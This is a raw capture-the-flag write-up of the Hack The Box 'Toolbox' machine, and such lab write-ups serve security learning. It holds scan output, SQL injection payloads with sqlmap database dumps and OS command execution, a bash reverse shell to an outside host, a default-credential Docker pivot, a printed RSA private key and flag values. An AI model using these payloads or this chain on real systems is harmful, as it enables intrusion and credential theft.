Toolbox IP: 10.10.10.236


rustscan:

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
5985/tcp  open  wsman        syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack


nmap:

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGMBbGgDiOZZt3bkOSs3/y3cFfYWVGPbw89lYh0OGLZ0J2eQfLPchbOe5jj+FY8uwizKA4ZwPrLe523TXoxTXmoI80LBl3sOPDb9xCBMfpYI72DRMiipB88CYC4vez8lsyofabtC2tkl6aMLc2zom62cI0jjBpmjLfLDUy1O9f/vFw0H+Qr2nGxr81dIy7E5ca5+lxMW1RP++TZAKK243GqgJLoZFRINIjA9QIgBmD2ZYSyUM3nkd8Kc5EuaaWuhggstXDEXOnxJP7S8p12IJhjtF2Tikcy5pg+qFD128o+PBa19FFc6NtNdaWDAnt8HvuZUbDgKy+e33ytA2dworB
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR9i0NqfFj31XNbDraGeI6rcylMmHucBKlMt4kswXRNyjdyXbxkYxHYt/cflrLg+687H7cfQKamV0RbLnqle7E=
|   256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOuBCr4Rn8G4uD6IINB2myKifcJ8tJU03cOPDpS5vz14
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MegaLogistics
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/organizationalUnitName=Web/emailAddress=admin@megalogistic.com
| Issuer: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/organizationalUnitName=Web/emailAddress=admin@megalogistic.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-02-18T17:45:56
| Not valid after:  2021-02-17T17:45:56
| MD5:   091b 4c45 c743 a4e0 bdb2 d2aa d860 f3d0
| SHA-1: 8255 9ba0 3fc7 79e4 f05d 8232 5bdf a957 8b2b e3eb
| -----BEGIN CERTIFICATE-----
| MIIECTCCAvGgAwIBAgIUFlHtTkX6tBT3FO+WSrUupHAN9TkwDQYJKoZIhvcNAQEL
| BQAwgZMxCzAJBgNVBAYTAkdSMRMwEQYDVQQIDApTb21lLVN0YXRlMRkwFwYDVQQK
| DBBNZWdhTG9naXN0aWMgTHRkMQwwCgYDVQQLDANXZWIxHzAdBgNVBAMMFmFkbWlu
| Lm1lZ2Fsb2dpc3RpYy5jb20xJTAjBgkqhkiG9w0BCQEWFmFkbWluQG1lZ2Fsb2dp
| c3RpYy5jb20wHhcNMjAwMjE4MTc0NTU2WhcNMjEwMjE3MTc0NTU2WjCBkzELMAkG
| A1UEBhMCR1IxEzARBgNVBAgMClNvbWUtU3RhdGUxGTAXBgNVBAoMEE1lZ2FMb2dp
| c3RpYyBMdGQxDDAKBgNVBAsMA1dlYjEfMB0GA1UEAwwWYWRtaW4ubWVnYWxvZ2lz
| dGljLmNvbTElMCMGCSqGSIb3DQEJARYWYWRtaW5AbWVnYWxvZ2lzdGljLmNvbTCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN11gJPFfp7ter5VFvgy0fCP
| 56N50Gk0R18C6e7KK3KKtXsjtIRD1Ri2ApmmjC+IwDpI0XgN0iem1NUbXE1HhwxB
| 1HrigkBudq3jQRVM0tVVYDK6+SEiOdehiXbc1Gsih0yUaMty4Ak6Asq4gli1g+ku
| fqtf7r273C8GJEQUHcCMBdXO/K1K2oTK9+bcsIETNuwALtwYbr/nim1RGLYQTtX7
| +CqkNj2Bw5YOxVqTAs5CQ3ZRIXTk/DLgR+bWOxxJKHLPFJfBq7czKkZ7k5gg9dPS
| HnWjW+amHutlRFYgRFeaaqiE+UBDVJDriB1zX1HUC3R1Y8IblatJRxV6tGKoG0cC
| AwEAAaNTMFEwHQYDVR0OBBYEFG4EpOryu7s315zTdLHk2SbghyWvMB8GA1UdIwQY
| MBaAFG4EpOryu7s315zTdLHk2SbghyWvMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZI
| hvcNAQELBQADggEBAEjzSNoiMG7e/dtnsy59rdMah0dkpRe5Dmi7gZt3IbdgwzSi
| rVOxWtnP3lItPB+/Y8+SOgqr/xUqd3cT1Ebol5ZraeWBvYUfaMG7XE7I98wWiSGW
| 6pqeCJ8cWmVuzI4y0E11BSTHoJQYCcshChahp7bt+TiqdfJLHeigO55W2FGXj1mf
| YGCZ8xnG6jOvXwA5xn8H2RT2teCpejfW/gN47rSCDSZbkcQCDuiak/LRQ71QO8y6
| 2KK6EnYIaO3OnyPHov0CvZdx0XgSJUpQTlMOySuXL+teRHmHPx/r7GOMGP0vpKLs
| OXZaAjnSN1+8nCldxAiaL8u4kxikQkaMKo1/5Ks=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55209/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61473/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43938/udp): CLEAN (Timeout)
|   Check 4 (port 34913/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-07T08:16:41
|_  start_date: N/A





ftp:

ftp 10.10.10.236                              
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:kali): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"



nikto:

nikto -h https://10.10.10.236                                                                       
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.236
+ Target Hostname:    10.10.10.236
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=GR/ST=Some-State/O=MegaLogistic Ltd/OU=Web/CN=admin.megalogistic.com/emailAddress=admin@megalogistic.com
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=GR/ST=Some-State/O=MegaLogistic Ltd/OU=Web/CN=admin.megalogistic.com/emailAddress=admin@megalogistic.com
+ Start Time:         2023-02-07 03:24:07 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname '10.10.10.236' does not match certificate's names: admin.megalogistic.com
+ Server may leak inodes via ETags, header found with file /, inode: 5755, size: 59ed419c2b780, mtime: gzip
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 



DIRB:

dirb https://10.10.10.236/ -w /usr/share/wordlists/dirb/common.txt -t 64                

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb  7 03:18:37 2023
URL_BASE: https://10.10.10.236/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: NOT forcing an ending '/' on URLs
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://10.10.10.236/ ----
==> DIRECTORY: https://10.10.10.236/css/                                                                                                                                                            
==> DIRECTORY: https://10.10.10.236/fonts/                                                                                                                                                          
==> DIRECTORY: https://10.10.10.236/images/                                                                                                                                                         
+ https://10.10.10.236/index.html (CODE:200|SIZE:22357)                                                                                                                                             
==> DIRECTORY: https://10.10.10.236/js/                                                                                                                                                             
+ https://10.10.10.236/server-status (CODE:403|SIZE:278)                                                                                                                                            
                                                                                                                                                                                                    
---- Entering directory: https://10.10.10.236/css/ ----
                                                                                                                                                                                                    
(!) FATAL: Too many errors connecting to host
    (Possible cause: OPERATION TIMEOUT)
                                                                               
-----------------
END_TIME: Tue Feb  7 03:32:53 2023
DOWNLOADED: 6966 - FOUND: 2



from Nitkto we found a subdomain admin.megalogistic.com

this is an admin panel

while trying sql injection, there is an error message:

Warning: pg_query(): Query failed: ERROR: syntax error at or near "''" LINE 1: SELECT * FROM users WHERE username = '' or 1=1'' AND passwor... ^ in /var/www/admin/index.php on line 10

Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11

pg_query => postgresql

Managed to bypass the login using username: admin' and passwd: or 1=1--

we can't update anything on the page, time to find something else :|


use burp to intercept the login request and save it to a file

we will configure sqlmap to use the http request

┌──(kali㉿kali)-[~/Practice/HackTheBox/ToolBox]
└─$ sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl                                                                                                                                 2 ⨯
        ___


sqlmap identified the following injection point(s) with a total of 135 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-3536' OR 3872=3872-- cWML&password=admin

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin' AND 9557=CAST((CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (9557=9557) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC)-- RERV&password=admin

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin';SELECT PG_SLEEP(5)--&password=admin

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin' AND 7287=(SELECT 7287 FROM PG_SLEEP(5))-- YbtF&password=admin
---
[05:19:38] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[05:19:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 05:19:40 /2023-02-07/


we identifier the dbms being postgresql

we can list the databases
┌──(kali㉿kali)-[~/Practice/HackTheBox/ToolBox]
└─$ sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl -dbs


---
[05:20:51] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[05:20:51] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
[05:20:51] [INFO] fetching database (schema) names
[05:20:52] [INFO] retrieved: 'public'
[05:20:52] [INFO] retrieved: 'pg_catalog'
[05:20:52] [INFO] retrieved: 'information_schema'
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

[05:21:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 05:21:12 /2023-02-07/


we list the tables of public database:
┌──(kali㉿kali)-[~/Practice/HackTheBox/ToolBox]
└─$ sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl -D public --tables

---
[05:22:02] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[05:22:02] [INFO] fetching tables for database: 'public'
[05:22:02] [INFO] retrieved: 'users'
Database: public
[1 table]
+-------+
| users |
+-------+

[05:22:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 05:22:02 /2023-02-07/

we dump the contents of users table:

┌──(kali㉿kali)-[~/Practice/HackTheBox/ToolBox]
└─$ sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl -D public -T users --dump

---
[05:23:33] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[05:23:33] [INFO] fetching columns for table 'users' in database 'public'
[05:23:34] [INFO] retrieved: 'password'
[05:23:34] [INFO] retrieved: 'varchar'
[05:23:35] [INFO] retrieved: 'username'
[05:23:35] [INFO] retrieved: 'varchar'
[05:23:35] [INFO] fetching entries for table 'users' in database 'public'
[05:23:35] [INFO] retrieved: '4a100a85cb5ca3616dcf137918550815'
[05:23:36] [INFO] retrieved: 'admin'
[05:23:36] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[05:23:36] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[05:23:36] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[05:23:36] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[05:23:36] [INFO] starting 4 processes 
[05:23:43] [WARNING] no clear password(s) found                                                                                                                                                     
Database: public
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+

[05:23:43] [INFO] table 'public.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com/dump/public/users.csv'
[05:23:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 05:23:43 /2023-02-07/

we cant crack the hash :((

we could try sending commands with sqlmap using --os-cmd flag to see it works
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/ToolBox]
└─$ sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl --os-cmd whoami
---
[05:25:29] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[05:25:29] [INFO] fingerprinting the back-end DBMS operating system
[05:25:31] [INFO] the back-end DBMS operating system is Linux
[05:25:31] [INFO] testing if current user is DBA
[05:25:33] [INFO] retrieved: '1'
do you want to retrieve the command standard output? [Y/n/a] Y
[05:25:34] [INFO] retrieved: 'postgres'
command standard output: 'postgres'
[05:25:34] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 05:25:34 /2023-02-07/

┌──(kali㉿kali)-[~/Practice/HackTheBox/ToolBox]
└─$ sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl --os-cmd id 

---
[05:26:34] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[05:26:34] [INFO] fingerprinting the back-end DBMS operating system
[05:26:35] [INFO] the back-end DBMS operating system is Linux
[05:26:36] [INFO] testing if current user is DBA
[05:26:36] [INFO] retrieved: '1'
do you want to retrieve the command standard output? [Y/n/a] Y
[05:26:38] [INFO] retrieved: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'
command standard output: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'
[05:26:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 05:26:38 /2023-02-07/

we could try to get a shell using --os-shell

┌──(kali㉿kali)-[~/Practice/HackTheBox/ToolBox]
└─$ sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl --os-shell 


---
[05:27:26] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[05:27:26] [INFO] fingerprinting the back-end DBMS operating system
[05:27:27] [INFO] the back-end DBMS operating system is Linux
[05:27:27] [INFO] testing if current user is DBA
[05:27:28] [INFO] retrieved: '1'
[05:27:28] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[05:27:28] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 


now we could use a bash one liner to get a connection to our machine

os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'
do you want to retrieve the command standard output? [Y/n/a] Y
y


┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.236] 51049
bash: cannot set terminal process group (1686): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ 


we read the user flag located in /var/lib/postgresql

f0183e44378ea9774433e2ca6ac78c6a  flag.txt =user.txt



postgres@bc56e3cc55e9:/var/lib/postgresql$ ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 33874  bytes 4484209 (4.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 21837  bytes 21853416 (20.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12781  bytes 4047726 (3.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12781  bytes 4047726 (3.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


        runninf ifconfig shows that we are in a container


PrivEsc:

Docker Toolbox uses VirtualBox to run a VM that houses all the containers. This is achieved using
the Boot2Docker distribution on VirtualBox. Looking at the documentation, the default
credentials are found to be docker / tcuser . The Docker host is always present at the gateway
IP address

postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ python3 -c'import pty;pty.spawn("/bin/bash")'
<main$ python3 -c'import pty;pty.spawn("/bin/bash")'
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
ssh docker@172.17.0.1
docker@172.17.0.1's password: tcuser

   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ 

docker@box:~$ sudo -l
sudo -l
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL
docker@box:~$ sudo su                                                          
sudo su
root@box:/home/docker# cat /etc/os-release
cat /etc/os-release
NAME=Boot2Docker
VERSION=19.03.5
ID=boot2docker
ID_LIKE=tcl
VERSION_ID=19.03.5
PRETTY_NAME="Boot2Docker 19.03.5 (TCL 10.1)"
ANSI_COLOR="1;34"
HOME_URL="https://github.com/boot2docker/boot2docker"
SUPPORT_URL="https://blog.docker.com/2016/11/introducing-docker-community-directory-docker-community-slack/"
BUG_REPORT_URL="https://github.com/boot2docker/boot2docker/issues"
root@box:/home/docker#                   

root@box:/c/Users/Administrator# ls -la                                        
ls -la
total 1469
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 Feb  7 08:09 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 .ssh
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 3D Objects
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 AppData
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 Application Data
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Contacts
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Cookies
dr-xr-xr-x    1 docker   staff            0 Feb  8  2021 Desktop
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 Documents
dr-xr-xr-x    1 docker   staff            0 Apr  5  2021 Downloads
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Favorites
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Links
drwxrwxrwx    1 docker   staff         4096 Feb 18  2020 Local Settings
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Music
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 My Documents
-rwxrwxrwx    1 docker   staff       262144 Jan 11  2022 NTUSER.DAT
-rwxrwxrwx    1 docker   staff        65536 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TM.blf
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000002.regtrans-ms
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 NetHood
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Pictures
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Recent
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Saved Games
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Searches
dr-xr-xr-x    1 docker   staff            0 Sep 15  2018 SendTo
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Start Menu
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Templates
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Videos
-rwxrwxrwx    1 docker   staff        32768 Feb 18  2020 ntuser.dat.LOG1
-rwxrwxrwx    1 docker   staff        65536 Feb 18  2020 ntuser.dat.LOG2
-rwxrwxrwx    1 docker   staff           20 Feb 18  2020 ntuser.ini





we can get the id_rsa key  from the hidden ssh folder in C/Users/Administrator

root@box:/c/Users/Administrator/.ssh# cat id_rsa                               
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----


we save it into a file and then we give it 600 permission using chnmod


then we ssh to 10.10.10.236

ssh administrator@10.10.10.236 -i id_rsa

we then get the flag from Administrator\Desktop
Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@TOOLBOX C:\Users\Administrator>getuid
'getuid' is not recognized as an internal or external command,
operable program or batch file.

administrator@TOOLBOX C:\Users\Administrator>whoami
toolbox\administrator


administrator@TOOLBOX C:\Users\Administrator\Desktop>dir 
 Volume in drive C has no label.                
 Volume Serial Number is 64F8-B588              
                                                
 Directory of C:\Users\Administrator\Desktop    
                                                
02/08/2021  11:39 AM    <DIR>          .        
02/08/2021  11:39 AM    <DIR>          ..       
02/08/2021  11:39 AM                35 root.txt 
               1 File(s)             35 bytes   
               2 Dir(s)   5,499,490,304 bytes free

administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt 
cc9a0b76ac17f8f475250738b96261b3  

administrator@TOOLBOX C:\Users\Administrator\Desktop>



root flag: cc9a0b76ac17f8f475250738b96261b3  
        


